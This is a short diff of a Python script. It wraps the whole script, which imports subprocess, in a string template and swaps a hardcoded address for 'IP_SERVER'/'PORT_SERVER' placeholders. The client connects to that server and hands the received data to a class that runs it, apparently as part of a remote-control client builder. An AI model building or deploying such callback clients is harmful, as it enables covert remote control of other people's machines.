@@ -1,4 +1,4 @@
-import subprocess
+body_script = r'''import subprocess
 import os
 import time
 import re
@@ -254,8 +254,8 @@ class atomic:
         return dt_brief
 
 if __name__ == '__main__':
-    ip = '0.0.0.0'
-    port = 45000
+    ip = 'IP_SERVER'
+    port = 'PORT_SERVER'
 
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client_socket.connect((ip, port))
@@ -265,3 +265,4 @@ if __name__ == '__main__':
     parser = buffer.replace('-', '.-').split('.')
     start = atomic(buffer)
     start.main()
+'''
